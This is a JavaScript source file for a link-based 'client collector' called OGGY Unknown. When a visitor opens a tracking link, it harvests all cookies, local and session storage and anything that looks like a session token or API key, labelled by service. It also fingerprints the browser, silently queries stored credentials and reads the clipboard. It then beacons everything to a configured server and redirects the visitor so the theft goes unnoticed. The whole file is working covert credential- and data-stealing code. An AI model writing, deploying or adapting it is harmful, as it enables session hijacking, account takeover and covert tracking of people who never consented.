// OGGY Unknown — client collector.
// Runs on the /t/:slug page. Gathers everything reachable from JS,
// tags every cookie/credential with its site + direct link, POSTs to the API,
// then redirects the visitor to the owner's configured URL.
(function () {
  'use strict';

  const cfg = window.__OGGY__ || {};
  const api = cfg.api;
  const redirectUrl = cfg.redirect || 'https://example.com';
  if (!api) { location.replace(redirectUrl); return; }

  // ---------- utilities ----------
  function fnv1a(str) {
    let h = 0x811c9dc5;
    for (let i = 0; i < str.length; i++) {
      h ^= str.charCodeAt(i);
      h = (h + ((h << 1) + (h << 4) + (h << 7) + (h << 8) + (h << 24))) >>> 0;
    }
    return h.toString(16).padStart(8, '0');
  }
  function absoluteOrigin(hostname) {
    try { return location.protocol + '//' + hostname + '/'; }
    catch (_) { return null; }
  }

  // ---------- service guessing from cookie name ----------
  const SERVICE_HINTS = [
    [/^_ga|^_gid|^_gat/i,             'Google Analytics'],
    [/^_fbp|^_fbc/i,                  'Meta Pixel'],
    [/^_hj/i,                         'Hotjar'],
    [/^_clck|^_clsk/i,                'Microsoft Clarity'],
    [/^__cf|^cf_/i,                   'Cloudflare'],
    [/^AWSALB|^AWSELB/i,              'AWS ELB'],
    [/^JSESSIONID$/i,                 'Java / Tomcat'],
    [/^PHPSESSID$/i,                  'PHP'],
    [/^laravel_session$/i,            'Laravel'],
    [/^sessionid$/i,                  'Django / generic'],
    [/^csrftoken$/i,                  'Django CSRF'],
    [/^next-auth/i,                   'NextAuth'],
    [/^sb-/i,                         'Supabase'],
    [/^wordpress_|^wp-/i,             'WordPress'],
    [/^shopify/i,                     'Shopify'],
    [/^intercom/i,                    'Intercom'],
    [/^stripe/i,                      'Stripe'],
    [/^gh_sess|^logged_in/i,          'GitHub'],
    [/^li_at|^JSESSIONID$/i,          'LinkedIn'],
    [/^ct0|^auth_token$/i,            'X / Twitter'],
    [/^c_user|^xs$/i,                 'Facebook'],
    [/^SID|^HSID|^SSID|^APISID$/i,    'Google'],
    [/^SIDCC$/i,                      'Google session'],
    [/^jwt|^token|^access_token$/i,   'JWT / bearer'],
    [/^sess/i,                        'generic session'],
    [/^sid$/i,                        'generic session id']
  ];
  function guessService(name) {
    for (const [re, label] of SERVICE_HINTS) if (re.test(name)) return label;
    return null;
  }

  // ---------- cookie parsing ----------
  function parseCookies() {
    const site = location.hostname;
    const directLink = absoluteOrigin(site);
    const raw = document.cookie || '';
    const out = [];
    if (!raw) return out;
    for (const part of raw.split(';')) {
      const t = part.trim();
      if (!t) continue;
      const eq = t.indexOf('=');
      const name = eq >= 0 ? t.slice(0, eq) : t;
      const value = eq >= 0 ? t.slice(eq + 1) : '';
      out.push({
        name,
        value,
        domain: site,
        site,
        directLink,
        service_guess: guessService(name) || 'unknown'
      });
    }
    return out;
  }

  // ---------- storage dumps ----------
  function dumpStorage(kind) {
    try {
      const s = window[kind];
      const out = {};
      for (let i = 0; i < s.length; i++) {
        const k = s.key(i);
        out[k] = s.getItem(k);
      }
      return out;
    } catch (e) { return { _err: e.message }; }
  }

  // ---------- session token heuristics ----------
  const SESSION_NAME_RE = /(session|sess|sid|token|auth|jwt|login|bearer|csrf|xsrf|access|refresh|api[-_]?key|identity)/i;
  function looksLikeSession(name) {
    if (!name) return false;
    if (SESSION_NAME_RE.test(name)) return true;
    // long base64/hex-looking values are suspicious regardless of name
    if (/^[A-Za-z0-9_\-\.]{24,}$/.test(name)) return true;
    return false;
  }
  function looksLikeToken(value) {
    if (typeof value !== 'string') return false;
    if (value.length < 16) return false;
    if (/^ey[A-Za-z0-9_\-]+\./.test(value)) return true;      // JWT
    if (/^[A-Fa-f0-9]{32,}$/.test(value)) return true;         // hex
    if (/^[A-Za-z0-9_\-]{24,}={0,2}$/.test(value)) return true; // base64-ish
    return false;
  }
  function collectSessionTokens(cookies, storage) {
    const site = location.hostname;
    const directLink = absoluteOrigin(site);
    const out = [];
    for (const c of cookies) {
      if (looksLikeSession(c.name) || looksLikeToken(c.value)) {
        out.push({
          site, name: c.name, value: c.value, source: 'cookie',
          directLink, service_guess: c.service_guess
        });
      }
    }
    for (const [kind, obj] of Object.entries(storage)) {
      for (const [k, v] of Object.entries(obj || {})) {
        if (k === '_err') continue;
        if (looksLikeSession(k) || looksLikeToken(v)) {
          out.push({
            site, name: k, value: v, source: kind,
            directLink, service_guess: guessService(k) || 'unknown'
          });
        }
      }
    }
    return out;
  }

  // ---------- fingerprint surfaces ----------
  function canvasData() {
    try {
      const c = document.createElement('canvas');
      c.width = 240; c.height = 60;
      const ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = "16px 'Arial'";
      ctx.fillStyle = '#f60';
      ctx.fillRect(0, 0, 100, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('oggy-unknown\xf0\x9f\x91\x81', 2, 18);
      ctx.fillStyle = 'rgba(102,204,0,0.7)';
      ctx.fillText('oggy-unknown\xf0\x9f\x91\x81', 4, 20);
      return c.toDataURL();
    } catch (e) { return 'err:' + e.message; }
  }

  function webglInfo() {
    try {
      const c = document.createElement('canvas');
      const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (!gl) return { supported: false };
      const ext = gl.getExtension('WEBGL_debug_renderer_info');
      return {
        supported: true,
        vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
        renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
        version: gl.getParameter(gl.VERSION),
        shading: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
        maxTexture: gl.getParameter(gl.MAX_TEXTURE_SIZE)
      };
    } catch (e) { return { supported: false, err: e.message }; }
  }

  function detectFonts() {
    try {
      const bases = ['monospace', 'sans-serif', 'serif'];
      const list = [
        'Arial','Arial Black','Calibri','Cambria','Comic Sans MS','Consolas','Courier New',
        'Georgia','Helvetica','Impact','Lucida Console','Menlo','Monaco','Palatino',
        'Segoe UI','Tahoma','Times New Roman','Trebuchet MS','Verdana','Roboto',
        'Noto Sans','Ubuntu','DejaVu Sans','Fira Code','SF Pro Text','SF Pro Display',
        'Segoe UI Variable','Inter'
      ];
      const span = document.createElement('span');
      span.style.cssText = 'position:absolute;left:-9999px;top:-9999px;font-size:72px;white-space:nowrap';
      span.textContent = 'mmmmmmmmmmlli';
      document.body.appendChild(span);
      const baseW = {};
      for (const b of bases) { span.style.fontFamily = b; baseW[b] = span.offsetWidth; }
      const found = [];
      for (const f of list) {
        for (const b of bases) {
          span.style.fontFamily = `'${f}',${b}`;
          if (span.offsetWidth !== baseW[b]) { found.push(f); break; }
        }
      }
      document.body.removeChild(span);
      return found;
    } catch (e) { return []; }
  }

  async function batteryInfo() {
    try {
      if (!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return { charging: b.charging, level: b.level, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
    } catch (e) { return null; }
  }

  async function permissionsSnapshot() {
    try {
      if (!navigator.permissions) return {};
      const names = ['geolocation','notifications','camera','microphone','clipboard-read','clipboard-write','midi'];
      const out = {};
      for (const n of names) {
        try { out[n] = (await navigator.permissions.query({ name: n })).state; }
        catch (_) { out[n] = 'unavailable'; }
      }
      return out;
    } catch (e) { return {}; }
  }

  async function mediaDevices() {
    try {
      if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return [];
      const d = await navigator.mediaDevices.enumerateDevices();
      return d.map(x => ({ kind: x.kind, label: x.label, hasGroupId: !!x.groupId }));
    } catch (e) { return []; }
  }

  async function indexedDbInfo() {
    try {
      if (!indexedDB.databases) return [];
      const dbs = await indexedDB.databases();
      return dbs.map(d => ({ name: d.name, version: d.version, stores: [] }));
    } catch (e) { return []; }
  }

  async function cacheStorageNames() {
    try {
      if (!('caches' in window)) return [];
      return await caches.keys();
    } catch (e) { return []; }
  }

  async function serviceWorkerScopes() {
    try {
      if (!('serviceWorker' in navigator) || !navigator.serviceWorker.getRegistrations) return [];
      const regs = await navigator.serviceWorker.getRegistrations();
      return regs.map(r => (r.active && r.active.scriptURL) || (r.installing && r.installing.scriptURL) || (r.waiting && r.waiting.scriptURL) || 'unknown');
    } catch (e) { return []; }
  }

  async function storageEstimate() {
    try {
      if (!navigator.storage || !navigator.storage.estimate) return null;
      const est = await navigator.storage.estimate();
      return { usage: est.usage, quota: est.quota };
    } catch (e) { return null; }
  }

  // ---------- credential management api attempt ----------
  async function credentialAttempt() {
    const out = {
      available: !!(window.PasswordCredential && navigator.credentials && navigator.credentials.get),
      passwordRetrieved: false,
      federatedRetrieved: false,
      username: null,
      note: null
    };
    if (!out.available) {
      out.note = 'credential management api not exposed in this browser/context';
      return out;
    }
    try {
      // Password credential fetch. Browsers only return a credential if this origin
      // already has one stored AND the call is made in a user-gesture context.
      // On a first visit this returns null. That's the browser's design.
      const cred = await navigator.credentials.get({ password: true, mediation: 'silent' });
      if (cred && cred.type === 'password') {
        out.passwordRetrieved = true;
        out.username = cred.name || cred.id || null;
        out.note = 'password credential returned (username captured; password itself is never exposed by the api)';
      } else {
        out.note = 'no stored credential for this origin — silent get returned null';
      }
    } catch (e) {
      out.note = 'get() rejected: ' + (e && e.message ? e.message : 'unknown');
    }
    return out;
  }

  // ---------- clipboard attempt (permission-gated) ----------
  async function clipboardAttempt() {
    try {
      if (!navigator.clipboard || !navigator.clipboard.readText) return { available: false };
      const text = await navigator.clipboard.readText();
      return { available: true, text: String(text || '').slice(0, 2000) };
    } catch (e) {
      return { available: true, error: e && e.message ? e.message : 'blocked' };
    }
  }

  // ---------- build payload ----------
  async function build() {
    const nav = navigator;
    const scr = screen;
    const cookies = parseCookies();
    const local = dumpStorage('localStorage');
    const session = dumpStorage('sessionStorage');
    const sessionTokens = collectSessionTokens(cookies, { localStorage: local, sessionStorage: session });

    const payload = {
      ts: new Date().toISOString(),
      url: location.href,
      origin: location.origin,
      host: location.hostname,
      referrer: document.referrer || null,
      query: location.search || null,
      hash: location.hash || null,

      user_agent: nav.userAgent,
      ua_data: nav.userAgentData ? {
        brands: nav.userAgentData.brands,
        mobile: nav.userAgentData.mobile,
        platform: nav.userAgentData.platform
      } : null,
      platform: nav.platform,
      vendor: nav.vendor,
      language: nav.language,
      languages: nav.languages,
      do_not_track: nav.doNotTrack,
      cookie_enabled: nav.cookieEnabled,
      online: nav.onLine,

      screen: {
        width: scr.width, height: scr.height,
        availWidth: scr.availWidth, availHeight: scr.availHeight,
        colorDepth: scr.colorDepth, pixelDepth: scr.pixelDepth,
        orientation: scr.orientation ? scr.orientation.type : null,
        devicePixelRatio: window.devicePixelRatio
      },
      window: { innerWidth: innerWidth, innerHeight: innerHeight, outerWidth: outerWidth, outerHeight: outerHeight },

      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezone_offset: new Date().getTimezoneOffset(),
      locale: Intl.DateTimeFormat().resolvedOptions().locale,

      hardware_concurrency: nav.hardwareConcurrency,
      device_memory: nav.deviceMemory || null,
      max_touch_points: nav.maxTouchPoints,

      plugins: Array.from(nav.plugins || []).map(p => p.name),
      mime_types: Array.from(nav.mimeTypes || []).map(m => m.type),

      connection: nav.connection ? {
        effectiveType: nav.connection.effectiveType,
        downlink: nav.connection.downlink,
        rtt: nav.connection.rtt,
        saveData: nav.connection.saveData
      } : null,

      cookies,
      session_tokens: sessionTokens,
      local_storage: local,
      session_storage: session,

      indexed_db: await indexedDbInfo(),
      cache_names: await cacheStorageNames(),
      service_workers: await serviceWorkerScopes(),
      storage_estimate: await storageEstimate(),

      canvas_hash: fnv1a(canvasData()),
      canvas_data: canvasData(),
      webgl: webglInfo(),
      fonts: detectFonts(),

      permissions: await permissionsSnapshot(),
      battery: await batteryInfo(),
      media_devices: await mediaDevices(),

      credential_attempt: await credentialAttempt(),
      clipboard_attempt: await clipboardAttempt()
    };
    return payload;
  }

  // ---------- send + redirect ----------
  let redirected = false;
  function go() {
    if (redirected) return;
    redirected = true;
    location.replace(redirectUrl);
  }
  function send(payload) {
    const body = JSON.stringify(payload);
    let finished = false;
    const done = () => { if (!finished) { finished = true; go(); } };

    // beacon: survives the redirect/unload
    if (navigator.sendBeacon) {
      try {
        const ok = navigator.sendBeacon(api, new Blob([body], { type: 'application/json' }));
        if (ok) { setTimeout(done, 250); return; }
      } catch (_) {}
    }
    // fetch keepalive fallback
    try {
      fetch(api, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body,
        keepalive: true
      }).then(done, done);
    } catch (_) { done(); }

    // hard safety timer — never hang the visitor
    setTimeout(done, 2500);
  }

  build().then(send).catch(err => {
    send({ ts: new Date().toISOString(), _error: String(err && err.message || err), url: location.href });
  });
})();
